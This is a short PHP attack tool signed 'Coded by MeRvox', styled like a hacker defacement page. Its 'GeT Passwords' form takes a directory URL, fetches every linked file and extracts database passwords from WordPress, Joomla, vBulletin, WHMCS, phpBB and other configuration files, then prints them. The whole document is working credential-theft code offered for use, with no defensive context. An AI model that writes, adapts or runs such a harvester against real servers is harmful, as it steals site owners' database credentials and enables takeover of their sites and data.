  <body background="http://b.top4top.net/p_28743hl1.jpg">
<center><center>


<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<font style="color:#fff;text-shadow:0px 1px 5px #000;font-size:35px" face="Iceland">Coded by MeRvox

<br/>
<br/>

<?php
set_time_limit(0);
error_reporting(0);
echo'<form method="post">
<input type="text" name="conf" value="" />
<input type="submit" value="GeT Passwords" name="get" />
</form>';

$g = $_POST['get'];
$dir = $_POST['conf'];
//////////////////////////////////////////////////////////////////////////////////////////////
if(isset($g) && $dir != ""){

	$cn = @file_get_contents($dir);
	//preg_match_all('#href="(.*?)">(.*?)<#',$cn,$m);    // $m[2]
	preg_match_all('#href="(.*?)"#',$cn,$m);
	
	
	foreach($m[1] as $txt){
	
	$url = $dir.$txt;
	$cnurl = @file_get_contents($url);
	preg_match('#\'DB_PASSWORD\', \'(.*)\'#',$cnurl,$m1);         	  // wordpress
	preg_match('#password = \'(.*)\'#',$cnurl,$m2);              	  // joomla
	preg_match('#password\'] = \'(.*)\'#',$cnurl,$m3);         		  // vb
	preg_match('#db_password = "(.*)"#',$cnurl,$m4);          		  // whmcs
	preg_match('#db_password = \'(.*)\'#',$cnurl,$m4);        		  // whmcs
	preg_match('#dbpass = "(.*)"#',$cnurl,$m5);              		  //
	preg_match('#password	= \'(.*)\'#',$cnurl,$m6);        		  // connnect.php
	preg_match('#dbpasswd = \'(.*)\'#',$cnurl,$m8);         		  // phpBB 3.0.x
	preg_match('#password_localhost = "(.*)"#',$cnurl,$m9);           // conexao.php
	preg_match('#senha = "(.*)"#',$cnurl,$m10);                       // /_inc/config.inc.php
	
	if(!empty($m1[1])){ echo $m1[1]."<br>"; }
	elseif(!empty($m2[1])){ echo $m2[1]."<br>"; }
	elseif(!empty($m3[1])){ echo $m3[1]."<br>"; }
	elseif(!empty($m4[1])){ echo $m4[1]."<br>"; }
	elseif(!empty($m5[1])){ echo $m5[1]."<br>"; }
	elseif(!empty($m6[1])){ echo $m6[1]."<br>"; }
	elseif(!empty($m7[1])){ echo $m7[1]."<br>"; }
	elseif(!empty($m8[1])){ echo $m8[1]."<br>"; }
    elseif(!empty($m9[1])){ echo $m9[1]."<br>"; }
	elseif(!empty($m10[1])){ echo $m10[1]."<br>"; }
	
	}
	
}
?>